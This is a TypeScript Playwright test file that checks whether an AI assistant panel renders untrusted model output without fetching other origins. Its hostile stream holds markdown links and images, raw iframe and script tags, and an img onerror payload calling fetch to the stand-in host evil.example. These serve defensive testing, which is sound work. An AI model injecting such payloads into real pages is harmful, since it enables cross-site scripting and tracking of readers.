import type { Page, Route } from '@playwright/test';

import { test, expect } from './fixtures/base';

// A model's answer is untrusted text. If the panel rendered its links, images or embeds,
// merely reading an answer would make the reader's browser fetch an address the model
// chose, which leaks the reader's IP and a signal that the answer was read. The unit test
// of AssistantMarkdown pins the element allowlist; this one watches the real browser and
// asserts the thing that matters: no request leaves the app's own origin.
//
// Same gate as assistant-panel.spec.ts: the panel is built only with
// VITE_ASSISTANT_ENABLED=true, so without the flag the file is skipped. In CI it runs in
// the `chromium-assistant` shard of the E2E job and skips in every other shard. To run it:
//   VITE_ASSISTANT_ENABLED=true npx playwright test e2e/assistant-outbound.spec.ts --project=chromium
// Nothing here needs the API: every request the app makes is answered by a route.
test.skip(
  process.env.VITE_ASSISTANT_ENABLED !== 'true',
  'The assistant is built only with VITE_ASSISTANT_ENABLED=true'
);

const USER = {
  id: 'e2e-user',
  email: 'assistant-e2e@example.com',
  first_name: 'Ada',
  last_name: 'Tester',
  photo_url: null,
  created_at: '2026-01-01T00:00:00Z',
};

const CONFIG = {
  enabled: true,
  model: 'test-model',
  mode: 'workflow',
  collection: 'test',
  answer_provider: 'local',
  query_provider: 'local',
  embedding_provider: 'local',
};

// The url is an https address outside the app. The row is closed here and nothing in this
// test opens it, so the "Open source" link, which a user may click on purpose, is never
// rendered; what is checked is that nothing is FETCHED.
const SOURCE = {
  n: 1,
  title: 'Outside page',
  section: 'Somewhere',
  snippet: 'A snippet of the outside page.',
  url: 'https://evil.example/source-page',
  layer: 'public',
};

const QUESTION = 'What does the result mean?';
const STREAM = '**/api/v1/assistant/chat/stream';
const MARKER = 'Zanzibar closing sentence';

// Every way of making a browser fetch something from markdown or from raw HTML, split
// across several tokens the way a model streams it (a token can end inside a construct).
const TOKENS = [
  'Read [this link](https://evil.example/link) and ![inline](https://evil.example/inline.png) ',
  'and ![by reference][pic] and [by reference link][ref].\n\n',
  '<img src="https://evil.example/raw.png" onerror="fetch(\'https://evil.example/xss\')"> ',
  '<iframe src="https://evil.example/frame"></iframe> ',
  '<script src="https://evil.example/script.js"></script> ',
  'An autolink <https://evil.example/a> and a citation [1]. ',
  `${MARKER}.\n\n`,
  '[pic]: https://evil.example/ref.png\n[ref]: https://evil.example/ref\n',
];
const ANSWER = TOKENS.join('');

function sse(events: ReadonlyArray<readonly [string, unknown]>): string {
  return events.map(([name, data]) => `event: ${name}\ndata: ${JSON.stringify(data)}\n\n`).join('');
}

const hostileStream = (route: Route) =>
  route.fulfill({
    status: 200,
    contentType: 'text/event-stream',
    body: sse([
      ...TOKENS.map((text) => ['token', { text }] as const),
      [
        'done',
        {
          answer: ANSWER,
          sources: [SOURCE],
          tools_used: ['search_docs'],
          checks: { citations_valid: true, numbers_grounded: true, ungrounded_numbers: [] },
          usage: { input_tokens: 10, output_tokens: 12, total_tokens: 22, llm_calls: 1, complete: true },
          timing: { ttft_ms: 40, total_ms: 400 },
        },
      ],
    ]),
  });

/**
 * Records and aborts every http(s) request to an origin other than the app's own, records
 * every WebSocket to another host, and returns the set it fills (a Set, because both nets
 * see the same request). Two nets, so a miss in one does not hide a request:
 *  - a catch-all route that aborts the request, so nothing real leaves this machine even
 *    if the app does misbehave, and
 *  - a `request` listener on the context, which sees what the route did not (it fires for
 *    every request of every page, popups included, whether or not a route handled it).
 * Neither sees a WebSocket, so a `websocket` listener on the page records those; the dev
 * server's own HMR socket is on the app's host and does not count.
 * The route is on the context, not the page: a page route does not see traffic of a
 * popup or a service worker, and the context one does. Page routes always take precedence
 * over context routes, whatever the order of registration (among page routes the last
 * one registered wins), so the API mocks below answer first, and a same-origin request
 * falls through to the dev server with `fallback()`.
 */
async function watchOutbound(page: Page, baseURL: string): Promise<Set<string>> {
  const appOrigin = new URL(baseURL).origin;
  const appHost = new URL(baseURL).host;
  const outside = new Set<string>();
  const isOutside = (url: string) => {
    const { protocol, origin } = new URL(url);
    return (protocol === 'http:' || protocol === 'https:') && origin !== appOrigin;
  };
  page.on('websocket', (socket) => {
    if (new URL(socket.url()).host !== appHost) outside.add(socket.url());
  });

  await page.context().route('**/*', async (route) => {
    if (isOutside(route.request().url())) {
      outside.add(route.request().url());
      await route.abort();
    } else {
      await route.fallback();
    }
  });
  page.context().on('request', (request) => {
    if (isOutside(request.url())) outside.add(request.url());
  });
  return outside;
}

/** Signs the app in and answers the config, with everything else a 404 so nothing reaches a server. */
async function mockApp(page: Page, onStream: (route: Route) => unknown) {
  await page.route('**/api/v1/**', (route) =>
    route.fulfill({ status: 404, contentType: 'application/json', body: JSON.stringify({ detail: 'not mocked' }) })
  );
  await page.route('**/api/v1/auth/me', (route) => route.fulfill({ json: USER }));
  await page.route('**/api/v1/assistant/config', (route) => route.fulfill({ json: CONFIG }));
  await page.route(STREAM, onStream);
}

async function openPanel(page: Page) {
  await page.goto('/about');
  await page.getByRole('button', { name: 'Assistant' }).first().click();
  await expect(page.getByRole('dialog', { name: 'Assistant' })).toBeVisible();
}

test.describe('Assistant panel, outbound requests', () => {
  test('the net sees a request to another origin', async ({ page, baseURL }) => {
    // The control for the test below: an empty list proves nothing unless the same
    // watcher is shown to fill when something does reach out.
    const outside = await watchOutbound(page, baseURL as string);
    await mockApp(page, hostileStream);
    await openPanel(page);

    const result = await page.evaluate(() =>
      fetch('https://evil.example/canary').then(
        () => 'fetched',
        () => 'blocked'
      )
    );

    expect(result).toBe('blocked');
    expect(outside.has('https://evil.example/canary')).toBe(true);
  });

  test('a hostile streamed answer makes the page request nothing from another origin', async ({ page, baseURL }) => {
    const outside = await watchOutbound(page, baseURL as string);
    await mockApp(page, hostileStream);
    // The list is not reset after the panel opens: the dev build asks no other origin for
    // anything while it starts (no fonts, analytics or error tracker), so everything the
    // page requests from the first navigation on counts. If that ever changes, reset the
    // list right before the question instead of allow-listing an origin.
    await openPanel(page);

    const box = page.getByRole('textbox', { name: 'Ask a question…' });
    await box.fill(QUESTION);
    await box.press('Enter');

    const feed = page.getByRole('log', { name: 'Conversation' });
    // The marker is plain text after every hostile construct, so seeing it means the
    // whole answer, the `done` event included, has been rendered.
    await expect(feed).toContainText(MARKER);
    await expect(feed.getByRole('button', { name: /Outside page/ })).toBeVisible();
    // A lazily loaded image or frame starts its request after the element is attached,
    // so let the page settle before reading the list: networkidle waits for 500 ms
    // without a request in flight, which is longer than a browser takes to start one.
    await page.waitForLoadState('networkidle');

    expect([...outside]).toEqual([]);
    // The same thing from the DOM: nothing that could fetch or navigate was rendered.
    for (const selector of ['img', 'iframe', 'script', '[src]', 'a[href]:not([href^="#"])']) {
      await expect(feed.locator(selector), selector).toHaveCount(0);
    }
  });
});
